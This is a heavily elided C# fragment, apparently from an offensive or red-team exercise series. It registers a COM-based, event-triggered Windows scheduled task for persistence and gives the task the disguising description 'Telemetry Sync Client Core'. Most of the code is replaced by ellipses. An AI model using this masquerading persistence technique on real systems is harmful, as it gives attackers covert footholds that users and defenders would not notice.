...
namespace A06_3b_COM_event_persist
{
    class Program
    {
...
#pragma warning restore CA1416
                ...
                regInfo.Description = "Telemetry Sync Client Core (Event Trigger)";
                ...
                Console.WriteLine("[+] Successfully registered COM-based event-triggered scheduled task!");
            }
